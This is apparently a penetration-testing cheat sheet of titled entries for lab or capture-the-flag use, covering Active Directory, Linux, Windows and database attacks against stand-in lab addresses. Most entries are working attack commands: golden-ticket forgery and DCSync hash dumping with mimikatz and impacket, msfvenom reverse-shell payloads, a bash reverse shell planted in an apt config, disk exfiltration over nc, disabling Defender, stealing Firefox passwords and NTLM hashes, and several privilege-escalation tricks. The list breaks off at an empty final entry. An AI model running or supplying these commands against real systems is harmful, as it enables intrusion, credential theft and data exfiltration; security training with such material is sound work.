item.title: Abuse Parent Child Domain Trusts
item.description: Privesc from DA to EA 1. Check direction and target Get-ADTrust -Filter * # Or nltest /domain_trusts # Or ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe 'lsadump::trust' 'exit' 3. Get krbtgt hash of current domain ./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit' 4. Forge a golden ticket # Append '-519' to target domain SID ./mimikatz.exe 'kerberos::golden /user:Administrator /rc4:<HASH> /domain:CURRENT.EXAMPLE.COM /sid:<CURRENT_DOMAIN_SID> /sids:<TARGET_DOMAIN_SID>-519 /ticket:c:\windows\tasks\ticket.kirbi' 'exit' Note: May need to try different high value hashes

item.title: AD Recycle Bin
item.description: AD Recycle Bin import-module activedirectory # Query all deleted objects within domain Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects # Get all details for the deleted account (e.g. TempAdmin) Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property * # Restore deleted account (Need to rename to avoid user exist) Restore-ADObject -Identity ObjectGUID -NewName "new_user" -TargetPath "CN=Users,DC=example,DC=com"

item.title: Advance wget
item.description: Advance wget # Provide a file with urls wget --input-file /root/root.txt # POST a file wget --post-file /root/root.txt http://10.10.14.10 # Overwrite a file wget http://10.10.14.10/passwd.txt -O /etc/passwd

item.title: Alternate Data Stream
item.description: Show ADS # cmd cmd /C dir /R \windows\tasks\file.txt Get-Item -Path \windows\tasks\file.txt -force -stream *

item.title: Apache
item.description: Check Apache version apache Config location /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/default-ssl.conf

item.title: Apache Tomcat
item.description: Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) # Create malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war # Open a nc listener rlwrap nc -lvnp 1337 Manager GUI +------------------------------------------+ |Exploit | +------------------------------------------+ |1. Login to Tomcat Web Application Manager| |2. WAR file to deploy -> Deploy | |3. Click /revshell in Applications table | +------------------------------------------+ Manager Script curl -u 'username:password' http://10.10.11.10:8080/manager/text/deploy?path=/revshell --upload-file revshell.war curl -s http://10.10.11.10:8080/revshell

item.title: Apt
item.description: MITM (Man-in-the-Middle) In target # In target export http_proxy=http://10.10.14.10:8888 In local # Tool pip3 install --upgrade proxy.py # Start a proxy server proxy --hostname 0.0.0.0 --port 8888 # Edit /etc/hosts to point to yours server 10.10.14.10 apt.update.example.com Privesc Abuse apt update # Create a malicious config echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'\''"}' > /etc/apt/apt.conf.d/evil # Exploit sudo apt update -y

item.title: Bloodhound
item.description: sharphound.ps1 Download sharphound.ps1 # Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all bloodhound.py python3 bloodhound.py -d example.com -u username -p password -dc example.com -ns 10.10.11.10 -c all --zip

item.title: Bypass ASMI
item.description: Payloads Using Hardware Breakpoints Scanning Interception Note: Tried these 2 and worked evil-winrm menu Bypass-4MSI Note: have to run menu first

item.title: Compressed Files
item.description: Hint: Always put the zip file inside a new folder before unzip zip # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # unzip unzip file.zip # unzip (powershell) Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('c:\windows\tasks\file.zip', 'c:\windows\tasks\') tar.gz # Compress a file tar -cvzf file.tar.gz file # Compress a folder tar -cvzf folder.tar.gz folder/ # Extract tar -xvzf file.tar.gz gz # Compress file, and keep the original file gzip -k -r file # Compress all files individually inside a folder, and keep original files gzip -k -r folder/ # Extract gunzip file.

item.title: Connection from Public Internet
item.description: Simply Catch HTTP Request webhook.site Catch HTTP Request and Host a Web Server serveo.net # Start a local HTTP server python3 -m http.server 3000 # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net ngrok Download ngrok ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS

item.title: CouchDB
item.description: Basic # Show all databases curl http://localhost:5984/_all_dbs # Show all databases (With Creds) curl http://user:password@localhost:5984/_all_dbs # Show all docs from database curl http://localhost:5984/DB_name/_all_docs # Show a entry curl http://localhost:5984/DB_name/ID_hash

item.title: Cron Jobs
item.description: Check Cron Jobs ls -la /etc/cron.d/ cat /etc/crontab crontab -l Tool Downlaod pspy ./pspy

item.title: Curl
item.description: Advance curl # POST url-encoded data curl --data-urlencode 'cmd=ping -c3 10.10.14.10' http://10.10.11.10/cmd.php # Put the POST data to url and use GET curl -G --data-urlencode 'cmd=ping -c3 10.10.14.10' http://10.10.11.10/cmd.php # PUT a file curl -X PUT http://10.10.11.10/test.txt -d @test.txt # PUT a file (with creds) curl -X PUT http://user:password@10.10.11.10/test.txt -d @test.txt # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT http://10.10.11.10/test.txt --data-binary @test.

item.title: Custom Word List Generator
item.description: CeWL Download CeWL # Creating custom wordlist by spidering target website cewl example.com -w example.com.wordlist --with-numbers

item.title: Defender (Windows)
item.description: Disable defender # Disable realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Completely disable defender New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

item.title: disk
item.description: Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse disk group to read root filesystem # Open target device debugfs /dev/sda1 # Exploit ls /root Abuse disk group to read container’s filesystem # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 > dm-0.gz # Exfil filesystem (target container rootfs, e.g. dm-0) dd if=/dev/dm-0 | gzip -1 - | nc 10.

item.title: DNS Enum
item.description: Zone Transfer dig example.com axfr @10.10.11.10 Domain Discovery dig @10.10.11.10 example.com dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 +short example.com any dig @10.10.11.10 -t NS example.com dig @10.10.11.10 _gc.example.com

item.title: Docker
item.description: Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root Docker API # Show running containers curl -s --unix-socket /var/run/docker.sock http://localhost/images/json # Create container curl -s -X POST -H 'Content-Type: application/json' --data-binary '{"Image": "<image_name>:latest","HostConfig": {"Binds": ["/:/r"]}, "Cmd": ["/bin/sh", "-c", "ls -la /r/root/"], "Tty": true}' --unix-socket /var/run/docker.sock http://localhost/containers/create # Start container curl -s -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docker.

item.title: Docker Registry
item.description: API # List repos curl -s -k --user "username:password" https://docker.example.com/v2/_catalog # List of tags of this repo curl -s -k --user "username:password" https://docker.example.com/v2/REPO_NAME/tags/list # List manifest file for this tag (e.g. latest) curl -s -k --user "username:password" https://docker.example.com/v2/REPO_NAME/manifests/latest # Get a commit of the image curl -s -k --user "username:password" https://docker.example.com/v2/REPO_NAME/blobs/sha256:BLOB_HASH'

item.title: dotnet
item.description: Compile c# project from Linux Download dotnet # Check dotnet --info # Prepare mkdir new_project cd new_project # Init dotnet new console # Add dependencies (optional) dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 +----------------------+ |Add Code to Program.cs| +----------------------+ # Run dotnet run

item.title: Drupal
item.description: droopescan Download droopescan droopescan scan drupal -u http://10.10.11.10 Note: This can take a long time to run

item.title: elasticsearch
item.description: Basic Commands # List indexes curl -s http://10.10.11.10:9200/_cat/indices?v # Dump data with index name (e.g. index_name) curl -s -X GET "http://10.10.11.10:9200/index_name/_search?size=100" -H 'Content-Type: application/json' -d' { "query": { "match_all": {} } } ' | jq .

item.title: File Transfer (Linux To Linux)
item.description: HTTP # Start a local HTTP server python3 -m http.server 80 # wget wget http://10.10.14.10/file # curl curl http://10.10.14.10/file -o /tmp/file nc # In our local Linux machine nc -lvnp 4444 < file # In target Linux machine nc -w3 10.10.14.10 4444 > file scp Remote to Local # If you have target password scp user@10.10.11.10:/tmp/remote/file /tmp/local/file # If you have a ssh key scp -i id_rsa user@10.10.11.10:/tmp/remote/file /tmp/local/file Local to Remote # If you have target password scp /tmp/local/file user@10.

item.title: File Transfer (Linux to Windows)
item.description: HTTP Start a Local HTTP Server python3 -m http.server 80 cmd certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe && c:\windows\tasks\rev.exe powershell # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile c:\windows\tasks\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: PowerShell 3.0+ # Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe # Short version powershell -ep bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: curl is not always available

item.title: File Transfer (Windows To Linux)
item.description: SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share # Older Windows (e.

item.title: Find
item.description: Locate a file locate cmd.php Find files of type file find . -type f Find and Open find / -name test.txt -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2>/dev/null -ls Find files owned by user find / -user user -ls 2>/dev/null | grep -v -e " \/proc" -e " \/sys" Find files owned by group find / -group adm 2>/dev/null | grep -v -e ^/proc Find files created between 1/1/2024 and 31/12/2024 find / -type f -newermt 2024-01-01 !

item.title: Find (Windows)
item.description: Find a file ls -path \Users -Filter file.txt -recurse -erroraction silent where /R C:\Users file.txt Find a file, with rule dir /s /b /a:-d-h \Users\Administrator | findstr /i /v "appdata" +---------------------------------------+ |dir: | |/s : include subfolders | |/b : bare format | |/a:-d-h : exclude directories or hidden| | | |findstr: | |/i : case insensitive | |/v appdata : exclude 'appdata' | +---------------------------------------+ Show hidden files Get-ChildItem -force

item.title: Finger Protocol
item.description: Basic # Check logged in users finger @10.10.11.10 # Check valid user finger user@10.10.11.10 Brute force usernames perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.11.10 Note: finger-user-enum.pl

item.title: Firefox
item.description: Extract saved passwords Download firefox_decrypt # Auto detect path python firefox_decrypt.py # Specify path python firefox_decrypt.py /folder/containing/profiles.ini/

item.title: Firewall (Windows)
item.description: Check Firewall Rules # cmd cmd /c "netsh advfirewall firewall show rule name=all|findstr Name:" # powershell Get-NetFirewallProfile # Check outbound rules Get-NetFirewallRule -Direction Outbound -Enabled True

item.title: Flask Cookie
item.description: Flask Cookie pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k" # Brute force secret key flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k" -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret "secret123"

item.title: ForceChangePassword
item.description: ForceChangePassword rpcclient -U 'domain/username%password' 10.10.11.10 -c 'setuserinfo2 target_user 23 "Test123!"'

item.title: Forward Shell
item.description: Python Forward Shell Template #!/usr/bin/env python3 from cmd import Cmd import requests class Term(Cmd): prompt = "shell> " def default(self, args): response = requests.get("http://example.com/cmd.php", params = {"cmd": args}, proxies={"http":"http://127.0.0.1:8080"}) print(response.text) term = Term() term.cmdloop()

item.title: FTP
item.description: Basic # Connect ftp 10.10.11.10 +-------------------+ |Anonymous login | +-------------------+ |Username: anonymous| |Password: (empty) | +-------------------+ # List ls # Switch to binary transfer mode bin # Download get filename # Upload put filename # Exit quit Recusive download # anonymous login wget -r ftp://anonymous:@10.10.11.10 # with creds wget --user username --password password -m ftp://10.10.11.11 Note: Always check what’s in there first

item.title: GenericAll
item.description: Using PowerView.ps1 . .\PowerView.ps1 Authenticated # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members USER Runas $username = "domain\username" $password = "password" $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members USER -Credential $Cred

item.title: GenericWrite
item.description: Using PowerView.ps1 . .\PowerView.ps1 Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser user | ConvertFrom-UACValue Set-DomainObject -Identity user -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10

item.title: GetChanges/GetChangesAll
item.description: GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10 Mimikatz (From Windows) .\mimikatz.exe 'lsadump::dcsync /domain:EXAMPLE.COM /user:administrator' exit

item.title: git
item.description: Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log 'branch_name' --oneline # Show diff, a and b are commit hash # a is the older commit git diff [a] [b] # Show commit git show 'commit_hash' SUDO # Copy target project cp -r /var/www/html/project .

item.title: Graphql
item.description: Basic Commands # Get fields from schema curl -s 10.10.11.10:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{queryType{name,fields{name,description}}}}"}' | jq . # Get types name curl -s 10.10.11.10:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | jq . # Get fields of type (e.g. User) curl -s 10.10.11.10:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__type(name:\"User\"){name,fields{name}}}"}' | jq . # Dump data from type (e.g. User type with fields username and password) curl -s 10.10.11.10:3000/graphql -H "Content-Type: application/json" -d '{"query":"{User{username,password}}"}' | jq .

item.title: Grep
item.description: Basic grep 'text' file.txt Grep from files recursively (e.g from current directory) grep -rni 'text' . Grep from binary grep -a 'text' binary Grep hash from binary with perl regex grep -aPo '[a-fA-F0-9]{32}' binary Grep from binaries recusively (e.g. from /var/log) sudo grep -rHa "password" /var/log Find unique char of a file cat file.txt | od -cvA none -w1 | sort -bu | tr -d '\n' | tr -d ' '

item.title: Host a SMB Server
item.description: Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username test -password test Note: Sometimes smb server with creds may not work For older Windows Machines impacket-smbserver share .

item.title: Hydra
item.description: Hydra HTTP basic auth hydra -L usernames -P passwords -s 8080 -f example.com http-get / +-----------------------------------------+ |-s : port | |-L : usernames file | |-P : passwords file | |-f : exit when a login/pass pair is found| +-----------------------------------------+ Web Page Login Form hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form "/login.php:username=admin&password=^PASS^&remember=yes:Incorrect password" +-----------------------------------------+ |-l : username | |-P : wordlist | |http-post-form : service | |/login.php : action | |^PASS^ : payload indicator | |Incorrect password : login failure string| +-----------------------------------------+ SSH with user:password list hydra -C creds.

item.title: IIS
item.description: IIS Version +-------------------------------------------------------------------------------+ |Version Start Date End Date | +-------------------------------------------------------------------------------+ |IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 | |IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 | |IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027| |IIS 10 on Windows 10 Pro Jul 29, 2015 | |IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 | |IIS 8.

item.title: IMAP
item.description: IMAP/IMAPS # Connect to IMAP over ssl rlwrap openssl s_client -connect 10.10.11.10:993 # Login a LOGIN username password # List all mailboxes a LIST "" "*" # Select a mailbox (e.g. Inbox) a SELECT INBOX # Get mail from mailbox (e.g. #1) a FETCH 1 BODY.PEEK[]

item.title: IRC
item.description: Tool sudo apt install hexchat

item.title: Java
item.description: Java Decompile JAR Download jd-gui jd-gui

item.title: Java Environment
item.description: Set JDK Environment sudo update-alternatives --config java sudo update-alternatives --config javac

item.title: Joomla
item.description: Check Version curl -s http://10.10.11.10/administrator/manifests/files/joomla.xml | head Admin Panel http://10.10.11.10/administrator

item.title: Keepass
item.description: Master password cracking keepass2john key.kdbx > hash # With a key file keepass2john -k key.png key.kdbx > hash kpcli Download kpcli # Open kdbx kpcli --kdb key.kdbx # Open kdbx with a key file kpcli --key key.png --kdb key.kdbx # List all passwords find . # Show password (e.g. #0) show -f 0

item.title: Kerberoasting
item.description: AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting (From Linux) faketime -f +8h impacket-GetNPUsers -request 'example.com/user:password' -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt Note: Times skew have to be within 5 minutes in kerberos Kerberoasting (From Windows) .\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password

item.title: Kerberos
item.description: Kerbrute Download kerbrute kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.10 Generate Kerberos Ticket (From Linux) sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to `/etc/hosts` 10.10.11.10 example.com dc01.example.com dc01 # Step 2: Add domain controller as a DNS server to `/etc/resolv.conf` nameserver 10.10.11.10 # Step 3: Edit `/etc/krb5.conf` [libdefaults] default_realm = EXAMPLE.COM [realms] example.com = { kdc = dc01.example.com:88 admin_serve = dc01.example.com default_domain = example.com } [domain_realm] .

item.title: LDAP
item.description: Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u 'example.com\username' -p 'passowrd' 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b 'DC=EXAMPLE,DC=COM' # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b 'DC=EXAMPLE,DC=COM' '(objectClass=person)' # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.

item.title: Linux hard disk encryption
item.description: Brute force LUKS password bruteforce-luks -t 10 -f wordlist.txt -w state.txt -v 30 backup.img Note: This is slow, create a small wordlist Open cryptsetup open --type luks backup.img backup Check ls -l /dev/mapper/ Mount sudo mkdir /mnt/backup sudo mount /dev/mapper/backup /mnt/backup/

item.title: Listeners
item.description: nc rlwrap nc -lvnp 1337 ncat # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp 1337 pwncat Download pwncat pwncat-cs -lp 1337 # After getting a connection (local) pwncat$ back

item.title: lxd
item.description: Basic Commands # Check if user in lxd group id # List containers lxc list # List images lxc image list Privesc / Container Escape # Upload a 656 bytes conatiner image echo  | base64 -d > test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root Build image for other arch git clone git clone https://github.

item.title: Magic Bytes
item.description: png echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> php-reverse-shell.php.png cat php-reverse-shell.php >> php-reverse-shell.php.png

item.title: memcache
item.description: Connect Using Telnet # Connect telnet 127.0.0.1 11211 Using memcached-cli # Install sudo npm install -g memcached-cli # Connect (With Creds) memcached-cli username:password@10.10.11.10:11211 Basic Commmands # Info about slabs stats slabs # Show slab info (e.g. slab 1 and display all keys) stats cachedump 1 0 # Dump info get item_name

item.title: Memory Dump
item.description: binwalk Download binwalk # Extract files from memory dump binwalk -M -e memory.dmp Mini Dump pypykatz lsa minidump memory.dmp

item.title: Metasploit
item.description: Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter

item.title: Metasploit Listener
item.description: Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.10 set lport 443 set AutoRunScript multi_console_command -r automigrate.

item.title: Metasploit Shellcode
item.description: Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 > rev.exe Windows x86 EXE # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 > rev.exe # Stageless msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread > rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 > rev.dll Note: These will be flagged by AV Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules

item.title: Microsoft Access Database
item.description: Tool sudo apt install mdbtools Basic # Show all tables mdb-tables database.mdb # Show tables with data mdb-tables database.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export database.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done # Dump data from table mdb-export database.mdb table_name

item.title: Microsoft Oulook Email Folder
item.description: Open .pst file Tool sudo apt install readpst Basic # Convert to mbox format readpst emails.pst # Open .mbox (plaintext) cat emails.mbox Read many emails # Use mutt mutt -Rf emails.mbox +------------------------------------+ |Note: Answer No to create /root/Mail| | | |Arrow : Move to the email | |Enter : View email | |q : back | |q again : quit | +------------------------------------+

item.title: MongoDB General
item.description: General Connect to Mongo Database mongo 10.10.11.10:27017 # Connect local with creds and specified database mongo -u user -p password db_name Basic Commands # Show all databases show dbs # Choose database use db_name # Show all collections show collections # Show all of the collection db.COLLECTION_NAME.find().pretty() # Insert entry into collections db.COLLECTION_NAME.insert({"key": "value"})

item.title: Mount Share
item.description: NFS List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Others # Check all mounted drives mount # Check how shares are mounted cat /etc/exports +----------------------------------------------------------------------------------------+ |root_squash : running as root on local system will be treated as nobody user in target | |no_all_squash: every other users permission will translate from local system to target | +----------------------------------------------------------------------------------------+ SMB Mount share sudo mount -t cifs //10.10.11.10/share /mnt # Without creds sudo mount -t cifs -o user=,password= //10.

item.title: MSSQL General
item.description: General Connect to MSSQL DB impacket-mssqlclient -windows-auth username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = '1'; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER'); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema SELECT table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table SELECT * from db_name.

item.title: MSSQL Linked Servers
item.description: Linked Servers Basic Commands Hint: Use double '' to escape ' in mssql # Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE ('select @@version;') at [LINKED_SERVER]; # Execute query from linked server to current server EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [CURRENT_SERVER]') at [LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE('EXECUTE(''CREATE LOGIN test WITH PASSWORD = ''''Test1234!

item.title: MSSQL Privilege Escalation
item.description: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree '\\10.10.14.10\any\thing'; # Or use master; exec xp_dirtree '\\10.10.14.10\any\thing'; # Or load_file('\\10.10.14.10\any\thing'); Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = 'sa'; exec sp_configure 'show advanced options', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; EXEC master.

item.title: Mysql General
item.description: General Connect to mysql Database # Database unknown mysql -u user -h 10.10.11.10 -p # Database known mysql -u user -D db_name -h 10.10.11.10 -p # Execute query inline mysql -u user -D db_name -h 10.10.11.10 -pPassword -e 'show tables;' Basic Commands # Show all databases show databases; # Choose database use db_name; # Show all tables show tables; # Show all entries in table_name select * from table_name; Update Entry # Update Entry Example UPDATE users set user_type='Administrator' where email='test@example.

item.title: Mysql Privilege Escalation
item.description: Privilege Escalation User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -pPassword mysql # UDF create table foo(line blob); insert into foo values(load_file('/dev/shm/raptor_udf2.so')); # Get plug-in directory show variables like '%plugin%'; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.

item.title: NetExec (nxc)
item.description: nxc Download nxc Basic Commands # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash Supported protocols +----------------------------------------------------------+ | ftp | ldap | mssql | rdp | smb | ssh | vnc | winrm | wmi | +----------------------------------------------------------+

item.title: Network Discovery
item.description: Test Connectivity ping -c3 10.10.11.10 Test Reverse Connectivity sudo tcpdump -ni tun0 icmp Sniff Network Traffic # For example: on port 389 tcpdump -i lo -nnXs 0 'port 389' Use ping to Scan Subnet for i in $(seq 1 254); do (ping -c 1 10.100.10.${i} | grep "bytes from" &); done; Use nc to Scan Ports for i in $(seq 1 65535); do (nc -zvn 127.0.0.1 ${i} 2>&1 | grep -v "Connection refused" &); done Check ARP arp -na cat /proc/net/arp Check IP # Linux ifconfig ip addr cat /proc/net/fib_trie # Windows ipconfig Check Network Connections # TCP netstat -plant # UDP netstat -plunt # If netstat not present cat /proc/net/tcp | grep '00000000:0000 0A' ss -tnl # Windows netstat -ano

item.title: Network Traffic Pivoting
item.description: Chisel Download chisel Start a Local chisel Server # In our local Linux machine ./chisel server --reverse --port 8000 chisel with ports # In target machine ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 chisel with socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1080 # In target machine .

item.title: Nginx
item.description: Config location /etc/nginx/sites-enabled

item.title: Nmap
item.description: Nmap Port Scan TCP Scan target=10.10.11.10 nmap -p- --min-rate 10000 -oA ./nmap-alltcp $target ports=$(cat nmap-alltcp.nmap| grep -Eo "^[0-9]+" | tr '\n' ',' | sed -r 's/,$//') nmap -p $ports -sCV -oA ./nmap-tcpscripts $target UDP Scan (common ports) target=10.10.11.10 nmap -sU --min-rate 10000 -oA ./nmap-udp $target ports=$(cat nmap-udp.nmap| grep -Eo "^[0-9]+" | tr '\n' ',' | sed -r 's/,$//') nmap -p $ports -sU -sCV -oA ./nmap-udpscripts $target Scan with nmap scripts Update scripts DB nmap --script-updatedb Search scripts nmap --script-help ftp* Scan with a script nmap --script=ftp-anon -sV -sC -p 21 10.

item.title: npm
item.description: npm Privilege Escalation Create a package.json { "name": "root", "version": "1.0.0", "scripts": { "preinstall": "/bin/bash" } } mkdir test mv package.json test/ sudo npm i test/ --unsafe

item.title: Openssl
